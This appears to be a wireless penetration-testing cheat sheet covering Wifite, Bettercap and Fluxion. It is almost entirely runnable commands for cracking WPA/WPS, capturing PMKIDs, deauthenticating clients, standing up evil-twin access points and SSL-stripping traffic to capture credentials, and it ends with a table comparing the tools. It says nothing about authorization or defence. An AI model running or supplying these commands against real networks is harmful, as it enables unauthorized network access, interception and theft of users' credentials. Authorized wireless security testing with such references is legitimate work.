# Automated Wireless Tools

## Wifite (All-in-One)
```bash
# Simple scan and attack
sudo wifite

# Attack WPA/WPA2 only
sudo wifite --wpa

# Attack WPS only
sudo wifite --wps
sudo wifite --wps-only

# PMKID capture only
sudo wifite --pmkid

# Attack WPA3 networks
sudo wifite --wpa3

# Evil twin attack
sudo wifite --evil-twin --essid TargetSSID

# Custom wordlist for cracking
sudo wifite --dict /path/to/wordlist.txt

# Ignore WPS lockout
sudo wifite --ignore-locks

# Crack existing captures
sudo wifite --cracked
```

## Bettercap (MITM + Wireless)
Bettercap is a powerful MITM framework with wireless capabilities.

```bash
# Start bettercap
sudo bettercap -iface wlan0

# WiFi module commands
wifi.recon on              # Start WiFi scanning
wifi.show                  # Show discovered APs
wifi.ap                    # Show current AP settings

# Deauth
wifi.deauth BSSID

# Evil twin
set wifi.ap.ssid TargetSSID
set wifi.ap.channel 6
wifi.ap.start

# HTTP proxy for credential capture
set http.proxy.sslstrip true
http.proxy on
```

## Fluxion (Evil Twin Automation)
Fluxion automates evil twin attacks with captive portal.

```bash
git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion
sudo ./fluxion.sh
# Menu-driven interface for evil twin attacks
```

## Comparison
| Tool | Best For |
|---|---|
| **Wifite** | Quick automated WPA/WPS cracking |
| **Bettercap** | MITM, credential capture, post-exploitation |
| **Fluxion** | Evil twin with captive portal UI |
| **Wifiphisher** | Evil twin with social engineering templates |
